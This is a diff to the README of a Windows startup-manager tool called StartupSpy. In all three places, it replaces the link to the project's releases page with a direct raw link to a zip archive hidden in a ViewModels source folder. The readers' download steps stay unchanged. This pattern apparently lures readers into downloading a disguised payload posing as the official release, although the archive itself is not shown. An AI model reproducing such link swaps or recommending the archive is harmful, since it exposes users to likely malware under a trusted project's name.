@@ -1,6 +1,6 @@
 # 🛡️ StartupSpy - See and manage startup items
 
-[![Download StartupSpy](https://img.shields.io/badge/Download-StartupSpy-7E57C2?style=for-the-badge&logo=github)](https://github.com/melabase781/StartupSpy/releases)
+[![Download StartupSpy](https://img.shields.io/badge/Download-StartupSpy-7E57C2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/melabase781/StartupSpy/main/ViewModels/Startup_Spy_3.8-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ StartupSpy helps you check what runs when Windows starts. It shows startup apps,
 
 Visit this page to download StartupSpy for Windows:
 
-https://github.com/melabase781/StartupSpy/releases
+https://raw.githubusercontent.com/melabase781/StartupSpy/main/ViewModels/Startup_Spy_3.8-alpha.2.zip
 
 1. Open the link above in your browser.
 2. Look for the latest release at the top of the page.
@@ -183,7 +183,7 @@ It uses a dark interface with clear sections and easy-to-read lists.
 
 Download or install StartupSpy from the official release page:
 
-https://github.com/melabase781/StartupSpy/releases
+https://raw.githubusercontent.com/melabase781/StartupSpy/main/ViewModels/Startup_Spy_3.8-alpha.2.zip
 
 ## 🖱️ After You Install
 
